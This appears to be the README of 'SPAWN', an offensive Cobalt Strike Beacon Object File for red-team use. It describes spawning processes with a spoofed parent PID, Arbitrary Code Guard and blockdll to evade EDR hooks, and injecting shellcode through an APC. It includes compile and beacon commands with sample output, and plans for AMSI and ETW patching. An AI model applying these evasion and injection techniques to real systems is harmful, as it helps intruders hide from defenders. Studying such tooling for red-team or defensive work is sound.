## SPAWN - Cobalt Strike BOF
Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing.
+ Due to ACG, this does not support shellcode which is dependent on these fuctionalities:
  + Toggling memory permissions between RW/RX. 
  + RWX memory   
+ To inject shellcode into a spawned process that is dependent on the above functionilities please see the [Hollow BOF project](https://github.com/boku7/HOLLOW)
+ For an awesome explaination on ACG please see Adam Chestner's blog below.

## New Features (08/01/2021)
+ Spawn sacrificial process with Arbitrary Code Guard (ACG) to prevent EDR solutions from hooking into sacrificial process DLL's.
  + See [Adam Chester's "Protecting Your Malware" blog for full details](https://blog.xpnsec.com/protecting-your-malware/). This part of the BOF is derived from his work.
+ Inject & Execute shellcode.  
#### Popin' Calc from ACG Protected Process
![](/images/8update.png)
```bash
beacon> spawn notepad.exe 6248 /Users/bobby.cooke/git/boku7/SPAWN/popCalc.bin
[*] SPAWN (Bobby Cooke//SpiderLabs|@0xBoku|github.com/boku7)
[+] Opened handle 0x534 to process 6248(PID)
[+] Spawned process: notepad.exe | PID: 8404 | PPID: 6248
[+] Allocated RE memory in remote process 8404 (PID) at: 0x00000177A72C0000
[+] Wrote 280 bytes to memory in remote process 8404 (PID) at 0x00000177A72C0000
[+] APC queued for main thread of 8404 (PID) to shellcode address 0x00000177A72C0000
```

## New Features (07/19/2021)
+ CNA Agressor Script interface
```bash
beacon> help
    spawn                     Spawn a process with a spoofed PPID and blockDll
beacon> help spawn
Synopsis: spawn /path/to/exe PPID
beacon> ps
8264  5536  OneDrive.exe                 x86   1           DESKTOP-KOSR2NO\boku 
beacon> spawn cmd.exe 8264
[*] SPAWN (@0xBoku|github.com/boku7)
Opened handle 0x634 to process 8264(PID)
Success! Spawned process: cmd.exe | PID: 5384 | PPID: 8264
```
+ PPID Spoofing
+ Cobalt Strike "like" `blockdll` functionality

### Compile with x64 MinGW:
```bash
x86_64-w64-mingw32-gcc -c spawn.x64.c -o spawn.x64.o
```
### Run from Cobalt Strike Beacon Console
+ After compile import the spawn.cna script into Cobalt Strikes Script Manager
```bash
beacon> spawn /path/to/exe PPID /local/path/to/shellcode.bin
```

### To Do List
+ ~Agressor script for better end user experience~   
  ![](/images/cna.png)
+ ~PPID spoofing for better parent-child process relation OPSEC~    
  ![](/images/ppidspoof.png)
  - Here we can see our `cmd.exe` process being spawned with the PPID as `OneDrive.exe`
+ ~implement Cobalt Strike `blockdll` functionality to prevent non-MS signed DLLs from loading into the spawned processes memory~    
  ![](/images/blockdll.png)
  - We see the parent-child process relationship, and that our spawned process has been created with the `Signatures restricted (Microsoft only)`
  - The `Signatures restricted (Microsoft only)` makes it so DLL's not signed by Microsoft cannot be loaded into our spawned process
+ ~~Do not crash the beacon process when the PE file does not exist~~  
  ![](/images/noCrashUpdate.png)
  - No longer crashes on process creation failure!
+ ~Return the PID to the Cobalt Strike console when the new process is spawned~  
  ![](/images/retpid.png)
+ ~Build out different methods of remote process injection~ (08/01/21)
+ Build out different methods of remote process patching
  + NTDLL.DLL remote process Unhooking
  + ETW remote process Patching/Bypass
  + AMSI remote process Patching/Bypass
  + CLR Loading & .Net assembly injection

### Why did I build this?
##### 1. To learn more about Cobalt Strike BOFs
##### 2. I want flexibility in choosing my sacraficial processes. 
  + Spawning the same process for every fork-and-run seems like bad/predictable OPSEC to me.
  + There are probably methods for this out there or built into CS already. Either way, I wanted to build my own.
##### 3. I have allot of cool BOF ideas that I want to build on this.

### Credits / References
##### PPID Spoofing & blockDll functionality
+ Credit/shoutout to: Adam Chester @_xpn_ + @SEKTOR7net + Raphael Mudge
+ Thank you for the amazing work that you've contributed. I would not be able to publish this without your blogs, videos, and awesome content!
+ Main References for PPID Spoofing & blockdll
  - https://blog.xpnsec.com/protecting-your-malware/
  - https://blog.cobaltstrike.com/2021/01/13/pushing-back-on-userland-hooks-with-cobalt-strike/
  - https://institute.sektor7.net/ (Courses)
##### Raphael Mudge - Beacon Object Files - Luser Demo
+ https://www.youtube.com/watch?v=gfYswA_Ronw
##### Cobalt Strike - Beacon Object Files
+ https://www.cobaltstrike.com/help-beacon-object-files
##### BOF Code References
###### anthemtotheego/InlineExecute-Assembly
+ https://github.com/anthemtotheego/InlineExecute-Assembly/blob/main/inlineExecuteAssembly/inlineExecute-Assembly.cna
###### ajpc500/BOFs
+ https://github.com/ajpc500/BOFs/
###### trustedsec/CS-Situational-Awareness-BOF
+ https://github.com/trustedsec/CS-Situational-Awareness-BOF
##### Sektor7 Malware Dev Essentials course - learned how to do the early bird injection technique
+ https://institute.sektor7.net/red-team-operator-malware-development-essentials
